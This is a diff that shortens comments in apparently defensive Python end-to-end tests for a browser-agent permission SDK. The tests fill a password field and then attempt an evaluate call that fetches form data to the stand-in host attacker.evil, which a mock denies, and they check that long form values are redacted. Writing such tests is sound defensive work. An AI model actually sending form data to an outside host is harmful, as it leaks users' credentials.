@@ -1,15 +1,9 @@
-"""Deeper browser-use / Playwright E2E tests (Phase 3 — AT).
+"""browser-use / Playwright hostile-site E2E tests.
 
-A14's existing ``test_real_browseruse.py`` covers the surface — navigation
-flow, form fill routing through the data scope, redaction, evaluate
-gating, deny-on-goto. The contribution of this file is a **hostile-site
-scenario**: a real page tries to exfiltrate form data to a denied
-domain, and Vanzik must (a) gate every relevant operation and (b)
-surface the deny back through the agent SDK as a ``PermissionError``.
-
-Closes the v0.5 plan AT brief item: "an end-to-end 'hostile site'
-scenario where the page tries to ex-fill form data to a denied domain,
-gates fire correctly, and the agent SDK gets the right error."
+``test_real_browseruse.py`` covers the individual gated methods; here a
+real page tries to exfiltrate form data to a denied domain, and Vanzik
+must gate every relevant operation and surface the deny as a
+``PermissionError``.
 """
 
 from __future__ import annotations
@@ -33,14 +27,9 @@ from .conftest import allow, deny  # noqa: E402
 pytestmark = [pytest.mark.integration, pytest.mark.playwright]
 
 
-# A "hostile" page that contains an inline script trying to ex-fill form
-# data to attacker.evil. The script does NOT actually run a fetch from
-# inside Playwright — that would require a real DNS lookup. Instead the
-# test scenario is: the agent fills the form, then the agent (driven by
-# external code) calls evaluate(...) which tries to fetch attacker.evil.
-# Vanzik sees the evaluate call and the scope is browser; the test's
-# mock returns DENY for this specific URL pattern, exercising the
-# end-to-end refusal path.
+# The page itself fetches nothing (that would need real DNS). The agent
+# fills the form, then calls evaluate(...) with a fetch to attacker.evil,
+# which the mock DENYs.
 _HOSTILE_HTML = (
     "data:text/html,"
     "<html><body>"
@@ -98,10 +87,8 @@ class TestHostileSiteScenario:
              denied it.
           3. NOT execute the underlying Playwright evaluate.
 
-        The integration_mock is configured to ALLOW navigation + fill,
-        and DENY any evaluate that contains the attacker domain.
+        The mock ALLOWs navigation and fill, then DENYs the evaluate.
         """
-        # Build a queue: ALLOW navigation, ALLOW fill, DENY exfil.
         integration_mock.enqueue_check(
             allow(reason="goto-ok"),
             allow(reason="fill-ok"),
@@ -112,12 +99,8 @@ class TestHostileSiteScenario:
         guard = Guard(integration_mock.base_url, agent_id="bu-at-hostile")
         gp = GuardedPage(page, guard)
 
-        # Step 1: navigate.
         run(gp.goto(_HOSTILE_HTML))
-        # Step 2: fill the password field. This routes through scope=data.
         run(gp.fill("#password", "hunter2"))
-        # Step 3: attempt to ex-fill. evaluate routes through scope=browser.
-        # The mock returns DENY; the SDK must raise.
         with pytest.raises(PermissionError) as ei:
             run(
                 gp.evaluate(
@@ -133,7 +116,6 @@ class TestHostileSiteScenario:
             json.loads(r["body"])
             for r in integration_mock.requests_to("/v1/check")
         ]
-        # Three checks fired: goto, fill, evaluate.
         assert len(bodies) == 3
         assert bodies[0]["action"] == "goto"
         assert bodies[1]["scope"] == "data"
@@ -146,11 +128,7 @@ class TestHostileSiteScenario:
         self, integration_mock, real_page
     ):
         """Long form values must be replaced with ``<redacted; len=N>``
-        before reaching ``/v1/check``. This is an end-to-end check — the
-        redaction happens in the SDK's ``check_form_input`` / fill path
-        before the body is serialized to the wire.
-
-        We use a value that is comfortably above the 256-char threshold.
+        before reaching ``/v1/check``.
         """
         integration_mock.enqueue_check(
             allow(reason="goto-ok"),
@@ -168,10 +146,8 @@ class TestHostileSiteScenario:
             json.loads(r["body"])
             for r in integration_mock.requests_to("/v1/check")
         ]
-        # The fill body is the second one.
         fill_body = bodies[1]
         assert fill_body["scope"] == "data"
-        # The literal secret must NOT appear anywhere in the fill body.
         encoded = json.dumps(fill_body)
         assert secret not in encoded, (
             f"fill body leaked the literal secret: {encoded!r}"
